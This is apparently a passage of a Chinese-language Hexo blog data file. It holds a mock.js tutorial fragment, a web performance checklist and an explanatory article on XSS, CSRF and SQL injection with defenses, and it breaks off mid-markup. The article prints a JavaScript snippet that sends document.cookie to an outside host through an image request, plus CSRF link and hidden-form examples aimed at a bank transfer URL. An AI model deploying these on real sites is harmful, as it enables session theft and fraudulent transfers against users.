router;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>挂载路由接口，在根目录的 <code>app.js</code> 文件中添加：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// mock.js</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> mockApi = <span class=\"built_in\">require</span>(<span class=\"string\">'./routes/mock'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// mockjs</span></span><br><span class=\"line\">app.use(<span class=\"string\">'/api'</span>, mockApi);</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>小功告成，这时再启动服务：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ DEBUG=mock-server:* npm start</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; mock-server@0.0.0 start D:\\START\\files\\mock-server</span><br><span class=\"line\">&gt; node ./bin/www</span><br><span class=\"line\"></span><br><span class=\"line\">Tue, 03 Apr 2018 03:25:17 GMT mock-server:server Listening on port 3000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 访问 localhost:3000/api 就会得到相应的接口数据</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>更多 <code>mock.js</code> 配置请 <a href=\"https://github.com/nuysoft/Mock/wiki\" target=\"_blank\" rel=\"noopener\">查看更多</a></p>\n</li>\n</ol>\n"},{"title":"技术文章收集","date":"2048-12-31T16:00:00.000Z","_content":"","source":"_posts/技术文章收集.md","raw":"---\ntitle: 技术文章收集\ndate: 2049-01-01 00:00:00\ntags:\n  - 好文\ncategories:\n---\n","slug":"技术文章收集","published":1,"updated":"2018-03-27T03:20:07.940Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvw8002ps4c0srjezvgw","content":"","site":{"data":{}},"excerpt":"","more":""},{"id":"0809030","title":"网站性能优化方案","date":"2017-09-22T03:15:46.000Z","_content":"\n- **content 方面**\n  - 减少 `HTTP` 请求：合并文件、`CSS` 精灵、`inline Image`\n  - 减少 `DNS` 查询：DNS查询完成之前浏览器不能从这个主机下载任何任何文件。方法：DNS缓存、将资源分布到恰当数量的主机名，平衡并行下载和DNS查询\n  - 避免重定向：多余的中间访问\n  - 使 `Ajax` 可缓存\n  - 非必须组件延迟加载\n  - 未来所需组件预加载\n  - 减少 `DOM` 元素数量\n  - 将资源放到不同的域下：浏览器同时从一个域下载资源的数目有限，增加域可以提高并行下载量\n  - 减少` iframe` 数量\n  - 不要 `404`\n\n- **Server 方面**\n  - 使用 `CDN`\n  - 添加 `Expires` 或者 `Cache-Control` 响应头\n  - 对组件使用 `Gzip` 压缩\n  - 配置 `ETag`\n  - 尽可能早地发送缓冲区内容(Flush Buffer Early)\n  - Ajax使用GET进行请求\n  - 避免空 `src` 的img标签(iframe)\n\n- **Cookie 方面**\n  - 减小 `cookie` 大小\n  - 引入资源的域名不要包含 `cookie`\n\n- **css 方面**\n  - 将样式表放到页面顶部\n  - 不使用CSS表达式\n  - 减少使用 `@import`\n  - 不使用IE的 `filter`\n  - 尽量避免写在HTML标签中写style属性\n\n- **Javascript 方面**\n  - 将脚本放到页面底部\n  - 将javascript和css从外部引入\n  - 压缩javascript和css\n  - 删除不需要的脚本\n  - 减少DOM访问\n  - 合理设计事件监听器\n  - 多个变量声明合并\n\n- **图片方面**\n  - 优化图片：根据实际颜色需要选择色深、压缩\n  - 优化css精灵\n  - 不要在HTML中拉伸图片\n  - 保证 `favicon` 小并且可缓存\n\n- **移动方面**\n  - 尽量使用css3动画，开启硬件加速\n  - 适当使用 `touch` 事件代替 `click` 事件\n  - 避免使用css3渐变阴影效果\n  - 可以用transform: translateZ(0)来开启硬件加速\n  - 不滥用Float，Float在渲染时计算量比较大，尽量减少使用\n  - 不滥用Web字体，Web字体需要下载，解析，重绘当前页面，尽量减少使用\n  - 合理使用requestAnimationFrame动画代替setTimeout\n  - CSS中的属性（CSS3 transitions、CSS3 3D transforms、Opacity、Canvas、WebGL、Video）会触发GPU渲染，请合理使用。过渡使用会引发手机过耗电增加\n  - PC端的在移动端同样适用","source":"_posts/0809030_网站性能优化方案.md","raw":"---\nid: 0809030\ntitle: 网站性能优化方案\ndate: 2017-09-22 11:15:46\ntags:\n  - tips\ncategories:\n---\n\n- **content 方面**\n  - 减少 `HTTP` 请求：合并文件、`CSS` 精灵、`inline Image`\n  - 减少 `DNS` 查询：DNS查询完成之前浏览器不能从这个主机下载任何任何文件。方法：DNS缓存、将资源分布到恰当数量的主机名，平衡并行下载和DNS查询\n  - 避免重定向：多余的中间访问\n  - 使 `Ajax` 可缓存\n  - 非必须组件延迟加载\n  - 未来所需组件预加载\n  - 减少 `DOM` 元素数量\n  - 将资源放到不同的域下：浏览器同时从一个域下载资源的数目有限，增加域可以提高并行下载量\n  - 减少` iframe` 数量\n  - 不要 `404`\n\n- **Server 方面**\n  - 使用 `CDN`\n  - 添加 `Expires` 或者 `Cache-Control` 响应头\n  - 对组件使用 `Gzip` 压缩\n  - 配置 `ETag`\n  - 尽可能早地发送缓冲区内容(Flush Buffer Early)\n  - Ajax使用GET进行请求\n  - 避免空 `src` 的img标签(iframe)\n\n- **Cookie 方面**\n  - 减小 `cookie` 大小\n  - 引入资源的域名不要包含 `cookie`\n\n- **css 方面**\n  - 将样式表放到页面顶部\n  - 不使用CSS表达式\n  - 减少使用 `@import`\n  - 不使用IE的 `filter`\n  - 尽量避免写在HTML标签中写style属性\n\n- **Javascript 方面**\n  - 将脚本放到页面底部\n  - 将javascript和css从外部引入\n  - 压缩javascript和css\n  - 删除不需要的脚本\n  - 减少DOM访问\n  - 合理设计事件监听器\n  - 多个变量声明合并\n\n- **图片方面**\n  - 优化图片：根据实际颜色需要选择色深、压缩\n  - 优化css精灵\n  - 不要在HTML中拉伸图片\n  - 保证 `favicon` 小并且可缓存\n\n- **移动方面**\n  - 尽量使用css3动画，开启硬件加速\n  - 适当使用 `touch` 事件代替 `click` 事件\n  - 避免使用css3渐变阴影效果\n  - 可以用transform: translateZ(0)来开启硬件加速\n  - 不滥用Float，Float在渲染时计算量比较大，尽量减少使用\n  - 不滥用Web字体，Web字体需要下载，解析，重绘当前页面，尽量减少使用\n  - 合理使用requestAnimationFrame动画代替setTimeout\n  - CSS中的属性（CSS3 transitions、CSS3 3D transforms、Opacity、Canvas、WebGL、Video）会触发GPU渲染，请合理使用。过渡使用会引发手机过耗电增加\n  - PC端的在移动端同样适用","slug":"0809030_网站性能优化方案","published":1,"updated":"2018-03-26T12:22:56.675Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvwb002rs4c0w0ww6z6n","content":"<ul>\n<li><p><strong>content 方面</strong></p>\n<ul>\n<li>减少 <code>HTTP</code> 请求：合并文件、<code>CSS</code> 精灵、<code>inline Image</code></li>\n<li>减少 <code>DNS</code> 查询：DNS查询完成之前浏览器不能从这个主机下载任何任何文件。方法：DNS缓存、将资源分布到恰当数量的主机名，平衡并行下载和DNS查询</li>\n<li>避免重定向：多余的中间访问</li>\n<li>使 <code>Ajax</code> 可缓存</li>\n<li>非必须组件延迟加载</li>\n<li>未来所需组件预加载</li>\n<li>减少 <code>DOM</code> 元素数量</li>\n<li>将资源放到不同的域下：浏览器同时从一个域下载资源的数目有限，增加域可以提高并行下载量</li>\n<li>减少<code>iframe</code> 数量</li>\n<li>不要 <code>404</code></li>\n</ul>\n</li>\n<li><p><strong>Server 方面</strong></p>\n<ul>\n<li>使用 <code>CDN</code></li>\n<li>添加 <code>Expires</code> 或者 <code>Cache-Control</code> 响应头</li>\n<li>对组件使用 <code>Gzip</code> 压缩</li>\n<li>配置 <code>ETag</code></li>\n<li>尽可能早地发送缓冲区内容(Flush Buffer Early)</li>\n<li>Ajax使用GET进行请求</li>\n<li>避免空 <code>src</code> 的img标签(iframe)</li>\n</ul>\n</li>\n<li><p><strong>Cookie 方面</strong></p>\n<ul>\n<li>减小 <code>cookie</code> 大小</li>\n<li>引入资源的域名不要包含 <code>cookie</code></li>\n</ul>\n</li>\n<li><p><strong>css 方面</strong></p>\n<ul>\n<li>将样式表放到页面顶部</li>\n<li>不使用CSS表达式</li>\n<li>减少使用 <code>@import</code></li>\n<li>不使用IE的 <code>filter</code></li>\n<li>尽量避免写在HTML标签中写style属性</li>\n</ul>\n</li>\n<li><p><strong>Javascript 方面</strong></p>\n<ul>\n<li>将脚本放到页面底部</li>\n<li>将javascript和css从外部引入</li>\n<li>压缩javascript和css</li>\n<li>删除不需要的脚本</li>\n<li>减少DOM访问</li>\n<li>合理设计事件监听器</li>\n<li>多个变量声明合并</li>\n</ul>\n</li>\n<li><p><strong>图片方面</strong></p>\n<ul>\n<li>优化图片：根据实际颜色需要选择色深、压缩</li>\n<li>优化css精灵</li>\n<li>不要在HTML中拉伸图片</li>\n<li>保证 <code>favicon</code> 小并且可缓存</li>\n</ul>\n</li>\n<li><p><strong>移动方面</strong></p>\n<ul>\n<li>尽量使用css3动画，开启硬件加速</li>\n<li>适当使用 <code>touch</code> 事件代替 <code>click</code> 事件</li>\n<li>避免使用css3渐变阴影效果</li>\n<li>可以用transform: translateZ(0)来开启硬件加速</li>\n<li>不滥用Float，Float在渲染时计算量比较大，尽量减少使用</li>\n<li>不滥用Web字体，Web字体需要下载，解析，重绘当前页面，尽量减少使用</li>\n<li>合理使用requestAnimationFrame动画代替setTimeout</li>\n<li>CSS中的属性（CSS3 transitions、CSS3 3D transforms、Opacity、Canvas、WebGL、Video）会触发GPU渲染，请合理使用。过渡使用会引发手机过耗电增加</li>\n<li>PC端的在移动端同样适用</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><p><strong>content 方面</strong></p>\n<ul>\n<li>减少 <code>HTTP</code> 请求：合并文件、<code>CSS</code> 精灵、<code>inline Image</code></li>\n<li>减少 <code>DNS</code> 查询：DNS查询完成之前浏览器不能从这个主机下载任何任何文件。方法：DNS缓存、将资源分布到恰当数量的主机名，平衡并行下载和DNS查询</li>\n<li>避免重定向：多余的中间访问</li>\n<li>使 <code>Ajax</code> 可缓存</li>\n<li>非必须组件延迟加载</li>\n<li>未来所需组件预加载</li>\n<li>减少 <code>DOM</code> 元素数量</li>\n<li>将资源放到不同的域下：浏览器同时从一个域下载资源的数目有限，增加域可以提高并行下载量</li>\n<li>减少<code>iframe</code> 数量</li>\n<li>不要 <code>404</code></li>\n</ul>\n</li>\n<li><p><strong>Server 方面</strong></p>\n<ul>\n<li>使用 <code>CDN</code></li>\n<li>添加 <code>Expires</code> 或者 <code>Cache-Control</code> 响应头</li>\n<li>对组件使用 <code>Gzip</code> 压缩</li>\n<li>配置 <code>ETag</code></li>\n<li>尽可能早地发送缓冲区内容(Flush Buffer Early)</li>\n<li>Ajax使用GET进行请求</li>\n<li>避免空 <code>src</code> 的img标签(iframe)</li>\n</ul>\n</li>\n<li><p><strong>Cookie 方面</strong></p>\n<ul>\n<li>减小 <code>cookie</code> 大小</li>\n<li>引入资源的域名不要包含 <code>cookie</code></li>\n</ul>\n</li>\n<li><p><strong>css 方面</strong></p>\n<ul>\n<li>将样式表放到页面顶部</li>\n<li>不使用CSS表达式</li>\n<li>减少使用 <code>@import</code></li>\n<li>不使用IE的 <code>filter</code></li>\n<li>尽量避免写在HTML标签中写style属性</li>\n</ul>\n</li>\n<li><p><strong>Javascript 方面</strong></p>\n<ul>\n<li>将脚本放到页面底部</li>\n<li>将javascript和css从外部引入</li>\n<li>压缩javascript和css</li>\n<li>删除不需要的脚本</li>\n<li>减少DOM访问</li>\n<li>合理设计事件监听器</li>\n<li>多个变量声明合并</li>\n</ul>\n</li>\n<li><p><strong>图片方面</strong></p>\n<ul>\n<li>优化图片：根据实际颜色需要选择色深、压缩</li>\n<li>优化css精灵</li>\n<li>不要在HTML中拉伸图片</li>\n<li>保证 <code>favicon</code> 小并且可缓存</li>\n</ul>\n</li>\n<li><p><strong>移动方面</strong></p>\n<ul>\n<li>尽量使用css3动画，开启硬件加速</li>\n<li>适当使用 <code>touch</code> 事件代替 <code>click</code> 事件</li>\n<li>避免使用css3渐变阴影效果</li>\n<li>可以用transform: translateZ(0)来开启硬件加速</li>\n<li>不滥用Float，Float在渲染时计算量比较大，尽量减少使用</li>\n<li>不滥用Web字体，Web字体需要下载，解析，重绘当前页面，尽量减少使用</li>\n<li>合理使用requestAnimationFrame动画代替setTimeout</li>\n<li>CSS中的属性（CSS3 transitions、CSS3 3D transforms、Opacity、Canvas、WebGL、Video）会触发GPU渲染，请合理使用。过渡使用会引发手机过耗电增加</li>\n<li>PC端的在移动端同样适用</li>\n</ul>\n</li>\n</ul>\n"},{"title":"常见web安全及防护原理","date":"2018-03-22T05:54:59.000Z","_content":"\n<a href=\"#xss\">1. XSS-跨站脚本攻击</a>\n<a href=\"#csrf\">2. CSRF-跨站请求伪造</a>\n<a href=\"#sql\">3. SQL 注入</a>\n\n- 通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。\n- XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。\n\n#### <a name=\"xss\">1、XSS-跨站脚本攻击</a>\n- **什么是 `XSS`：**\n  - `XSS`：跨站脚本（`Cross-site scripting`，通常简称为 `XSS`）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了 `HTML` 以及用户端脚本(`JavaScript`)语言。\n  - 即：通过客户端脚本语言（最常见如：`JavaScript`）在一个论坛发帖中发布一段恶意的 `JavaScript` 代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做`XSS`！\n- **如何做到 `XSS`：**\n  1. 利用别人的 `cookie`，可以冒充真实的用户，在颁发 `cookie` 的那个网站中为所欲为。因为浏览器的同源策略，所以不能获取到其他网站的cookie，但通过把JavaScript代码注入到目标页面中，就能绕过同源策略，比如在HTML的 `<input>` 中注入JavaScript代码，等到数据提交到服务器端，会保存下来，下次展示页面的时候，就会执行这段代码。\n  举例有这样一个网站，可以让你对某个文章输入评论：\n  <img src=\"/images/xss1.png\" alt=\"xss\">\n  2. 等到再次有人访问这个页面的时候，就可以把那个人的cookie显示出来了！当然不能直接把用户的cookie直接alert出来，而同源策略严格限制了JavaScript的跨域访问，但同源策略并不限制 `<img>` 这样的标签从别的网站（跨域）去下载图片，所以可以通过创建一个不可见的 `<img>` ，通过这个 `<img>` 发cookie到自己的服务器。\n  直接上代码：\n  ```js\n  var img = document.createElement(\"img\");\n  img.src = \"http://web.com/log?\" + escape(document.cookie);\n  document.body.appendChild(img);\n  ```\n  3. 只要这段代码被执行，用户的cookie就会发送到别人的服务器上(`http://web.com/log`)。再将这段代码封装成一个js文件(web.js)。\n    <img src=\"/images/xss2.png\" alt=\"xss\">\n    这样就可以拿到用户的cookie。这种窃取用户的cookie的方法叫做XSS。\n    `注：`按照XSS的分类方法，上面介绍的叫做存储性XSS，危害最大。还有反射型XSS，基于DOM的XSS，本文不再展开。\n- **如何防范 `XSS`：**\n  - 首先代码里对用户输入的地方和变量都需要仔细检查长度和对`<`,`>`,`;`,`'`等字符做过滤；其次任何内容写到页面之前都必须加以 `encode`，避免不小心把 `html tag` 弄出来。这一个层面做好，至少可以堵住超过一半的XSS攻击\n  - 避免直接在cookie 中泄露用户隐私，例如email、密码等等\n  - 其次，通过使cookie 和系统 `ip` 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放\n  - 如果网站不需要再浏览器端对cookie 进行操作，可以在 `Set-Cookie` 末尾加上 `HttpOnly` 来防止javascript 代码直接获取cookie \n  - 尽量采用POST 而非GET 提交表单\n\n#### <a name=\"csrf\">2、CSRF-跨站请求伪造</a>\n- **什么是 `CSRF`：**\n  - `CSRF`：跨站请求伪造（英语：`Cross-site request forgery`），也被称为 `one-click attack` 或者 `session riding`，通常缩写为 `CSRF` 或者 `XSRF`， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。\n  - 即：冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。\n- **如何做到 `CSRF`：**\n  1. 一个用户的会话cookie在浏览器没有关闭的时候，是不会被删除的，所以可以换个思路，不再去偷这个cookie了，相反，可以在web.com中构造一个领奖页面，里面包含一个连接，让用户去惦记，例如：\n  ```html\n  恭喜你获得了iPhoneX一台，快来<a href=\"www.icbc.com.cn/transfer?toBankId=黑客的账户&money=金额\">领取</a>吧\n  ```\n  2. 这得先知道icbc.com.cn的转账操作的url和参数名称。如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了。\n  `注：`为了方便展示，本文举了一个非常简单的案例，银行实际的转账操作要远远比文章描述安全的多。\n  3. 除了让用户点击外，还可以使用img标签 `<img src=\"www.icbc.com.cn/transfer?toAccountID=黑客三兄弟的账户&money=金额\">`，只要用户打开了这个页面，不点击任何东西，就会发生转账操作。所以现在有很多邮箱默认是不显示邮件中的图片的。\n  4. 如果icbc.com.cn的转账操作需要form表单，是POST操作，那么可以自己创建一个表单，放到一个不可见的iframe中，用户只要一访问，就用JavaScript自动提交：\n  ```html\n  <form action=\"http://www.icbc.com.cn/transfer\" method=\"POST\">\n    <input type=\"text\" name=\"toAccountID\" value=\"黑客的账号\"/>\n    <input type=\"text\" name=\"money\" value=\"金额\"/>\n  </form>\n  ```\n  5. 总之，只要用户在访问icbc.com.cn的时候，访问了web.com，就极有可能中招，这种方式，只是利用了一下合法的Cookie，在服务器看来，发出的这个请求是一次合法的请求。这个就叫跨站请求伪造，Cross Site Request Forgest (CSRF)。\n- **如何防范 `CSRF`：**\n  1. 用户在icbc.com.cn转账，显示转账的form，除了常用的字段之外，额外添加一个token:\n  ```html\n  <form action=\"http://www.icbc.com.cn/transfer\" method=\"POST\">\n    <input type=\"hidden\" name=\"token\" value=\"axsa;dsww98725678836554xskdhf82735672\"/>\n    <input type=\"text\" name=\"toAccountID\" value=\"黑客的账号\"/>\n    <input type=\"text\" name=\"money\" value=\"金额\"/>\n  </form>\n  \n  <!-- 这个token是icbc.com服务器端生成的，是一个随机的数字。 -->\n  ```\n  2. 用户的转账数据发送的服务器端，icbc.com就会检查从浏览器发过来的数据中有没有token，并且这个token的值是不是和服务器端保存的相等，如果相等，就继续执行转账操作，如果不相等，那这次POST请求肯定是伪造的。\n    这个token是服务器端生成的，无法伪造，CSRF的手段也不行了。\n  3. 服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数，或者通过验证码的方法。\n\n#### <a name=\"sql\">3、SQL 注入</a>\n- **什么是 `SQL` 注入：**\n  - 就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。\n- **如何防范：**\n  1. 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双\"-\"进行转换等。\n  2. 永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。\n  3. 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。\n  4. 不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。\n\n<p style=\"text-align: right;\">`参考文档` [segmentfault](https://segmentfault.com/a/1190000013022789)</p>\n","source":"_posts/0809031_常见web安全及防护原理.md","raw":"---\ntitle: 常见web安全及防护原理\ndate: 2018-03-22 13:54:59\ntags:\n  - web\ncategories:\n---\n\n<a href=\"#xss\">1. XSS-跨站脚本攻击</a>\n<a href=\"#csrf\">2. CSRF-跨站请求伪造</a>\n<a href=\"#sql\">3. SQL 注入</a>\n\n- 通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。\n- XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。\n\n#### <a name=\"xss\">1、XSS-跨站脚本攻击</a>\n- **什么是 `XSS`：**\n  - `XSS`：跨站脚本（`Cross-site scripting`，通常简称为 `XSS`）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了 `HTML` 以及用户端脚本(`JavaScript`)语言。\n  - 即：通过客户端脚本语言（最常见如：`JavaScript`）在一个论坛发帖中发布一段恶意的 `JavaScript` 代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做`XSS`！\n- **如何做到 `XSS`：**\n  1. 利用别人的 `cookie`，可以冒充真实的用户，在颁发 `cookie` 的那个网站中为所欲为。因为浏览器的同源策略，所以不能获取到其他网站的cookie，但通过把JavaScript代码注入到目标页面中，就能绕过同源策略，比如在HTML的 `<input>` 中注入JavaScript代码，等到数据提交到服务器端，会保存下来，下次展示页面的时候，就会执行这段代码。\n  举例有这样一个网站，可以让你对某个文章输入评论：\n  <img src=\"/images/xss1.png\" alt=\"xss\">\n  2. 等到再次有人访问这个页面的时候，就可以把那个人的cookie显示出来了！当然不能直接把用户的cookie直接alert出来，而同源策略严格限制了JavaScript的跨域访问，但同源策略并不限制 `<img>` 这样的标签从别的网站（跨域）去下载图片，所以可以通过创建一个不可见的 `<img>` ，通过这个 `<img>` 发cookie到自己的服务器。\n  直接上代码：\n  ```js\n  var img = document.createElement(\"img\");\n  img.src = \"http://web.com/log?\" + escape(document.cookie);\n  document.body.appendChild(img);\n  ```\n  3. 只要这段代码被执行，用户的cookie就会发送到别人的服务器上(`http://web.com/log`)。再将这段代码封装成一个js文件(web.js)。\n    <img src=\"/images/xss2.png\" alt=\"xss\">\n    这样就可以拿到用户的cookie。这种窃取用户的cookie的方法叫做XSS。\n    `注：`按照XSS的分类方法，上面介绍的叫做存储性XSS，危害最大。还有反射型XSS，基于DOM的XSS，本文不再展开。\n- **如何防范 `XSS`：**\n  - 首先代码里对用户输入的地方和变量都需要仔细检查长度和对`<`,`>`,`;`,`'`等字符做过滤；其次任何内容写到页面之前都必须加以 `encode`，避免不小心把 `html tag` 弄出来。这一个层面做好，至少可以堵住超过一半的XSS攻击\n  - 避免直接在cookie 中泄露用户隐私，例如email、密码等等\n  - 其次，通过使cookie 和系统 `ip` 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放\n  - 如果网站不需要再浏览器端对cookie 进行操作，可以在 `Set-Cookie` 末尾加上 `HttpOnly` 来防止javascript 代码直接获取cookie \n  - 尽量采用POST 而非GET 提交表单\n\n#### <a name=\"csrf\">2、CSRF-跨站请求伪造</a>\n- **什么是 `CSRF`：**\n  - `CSRF`：跨站请求伪造（英语：`Cross-site request forgery`），也被称为 `one-click attack` 或者 `session riding`，通常缩写为 `CSRF` 或者 `XSRF`， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。\n  - 即：冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。\n- **如何做到 `CSRF`：**\n  1. 一个用户的会话cookie在浏览器没有关闭的时候，是不会被删除的，所以可以换个思路，不再去偷这个cookie了，相反，可以在web.com中构造一个领奖页面，里面包含一个连接，让用户去惦记，例如：\n  ```html\n  恭喜你获得了iPhoneX一台，快来<a href=\"www.icbc.com.cn/transfer?toBankId=黑客的账户&money=金额\">领取</a>吧\n  ```\n  2. 这得先知道icbc.com.cn的转账操作的url和参数名称。如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了。\n  `注：`为了方便展示，本文举了一个非常简单的案例，银行实际的转账操作要远远比文章描述安全的多。\n  3. 除了让用户点击外，还可以使用img标签 `<img src=\"www.icbc.com.cn/transfer?toAccountID=黑客三兄弟的账户&money=金额\">`，只要用户打开了这个页面，不点击任何东西，就会发生转账操作。所以现在有很多邮箱默认是不显示邮件中的图片的。\n  4. 如果icbc.com.cn的转账操作需要form表单，是POST操作，那么可以自己创建一个表单，放到一个不可见的iframe中，用户只要一访问，就用JavaScript自动提交：\n  ```html\n  <form action=\"http://www.icbc.com.cn/transfer\" method=\"POST\">\n    <input type=\"text\" name=\"toAccountID\" value=\"黑客的账号\"/>\n    <input type=\"text\" name=\"money\" value=\"金额\"/>\n  </form>\n  ```\n  5. 总之，只要用户在访问icbc.com.cn的时候，访问了web.com，就极有可能中招，这种方式，只是利用了一下合法的Cookie，在服务器看来，发出的这个请求是一次合法的请求。这个就叫跨站请求伪造，Cross Site Request Forgest (CSRF)。\n- **如何防范 `CSRF`：**\n  1. 用户在icbc.com.cn转账，显示转账的form，除了常用的字段之外，额外添加一个token:\n  ```html\n  <form action=\"http://www.icbc.com.cn/transfer\" method=\"POST\">\n    <input type=\"hidden\" name=\"token\" value=\"axsa;dsww98725678836554xskdhf82735672\"/>\n    <input type=\"text\" name=\"toAccountID\" value=\"黑客的账号\"/>\n    <input type=\"text\" name=\"money\" value=\"金额\"/>\n  </form>\n  \n  <!-- 这个token是icbc.com服务器端生成的，是一个随机的数字。 -->\n  ```\n  2. 用户的转账数据发送的服务器端，icbc.com就会检查从浏览器发过来的数据中有没有token，并且这个token的值是不是和服务器端保存的相等，如果相等，就继续执行转账操作，如果不相等，那这次POST请求肯定是伪造的。\n    这个token是服务器端生成的，无法伪造，CSRF的手段也不行了。\n  3. 服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数，或者通过验证码的方法。\n\n#### <a name=\"sql\">3、SQL 注入</a>\n- **什么是 `SQL` 注入：**\n  - 就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。\n- **如何防范：**\n  1. 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双\"-\"进行转换等。\n  2. 永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。\n  3. 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。\n  4. 不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。\n\n<p style=\"text-align: right;\">`参考文档` [segmentfault](https://segmentfault.com/a/1190000013022789)</p>\n","slug":"0809031_常见web安全及防护原理","published":1,"updated":"2018-03-22T09:57:14.948Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvwe002us4c0rj87plzf","content":"<p><a href=\"#xss\">1. XSS-跨站脚本攻击</a><br><a href=\"#csrf\">2. CSRF-跨站请求伪造</a><br><a href=\"#sql\">3. SQL 注入</a></p>\n<ul>\n<li>通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。</li>\n<li>XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。</li>\n</ul>\n<h4 id=\"1、XSS-跨站脚本攻击\"><a href=\"#1、XSS-跨站脚本攻击\" class=\"headerlink\" title=\"1、XSS-跨站脚本攻击\"></a><a name=\"xss\">1、XSS-跨站脚本攻击</a></h4><ul>\n<li><strong>什么是 <code>XSS</code>：</strong><ul>\n<li><code>XSS</code>：跨站脚本（<code>Cross-site scripting</code>，通常简称为 <code>XSS</code>）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了 <code>HTML</code> 以及用户端脚本(<code>JavaScript</code>)语言。</li>\n<li>即：通过客户端脚本语言（最常见如：<code>JavaScript</code>）在一个论坛发帖中发布一段恶意的 <code>JavaScript</code> 代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做<code>XSS</code>！</li>\n</ul>\n</li>\n<li><p><strong>如何做到 <code>XSS</code>：</strong></p>\n<ol>\n<li>利用别人的 <code>cookie</code>，可以冒充真实的用户，在颁发 <code>cookie</code> 的那个网站中为所欲为。因为浏览器的同源策略，所以不能获取到其他网站的cookie，但通过把JavaScript代码注入到目标页面中，就能绕过同源策略，比如在HTML的 <code>&lt;input&gt;</code> 中注入JavaScript代码，等到数据提交到服务器端，会保存下来，下次展示页面的时候，就会执行这段代码。<br>举例有这样一个网站，可以让你对某个文章输入评论：<br><img src=\"/images/xss1.png\" 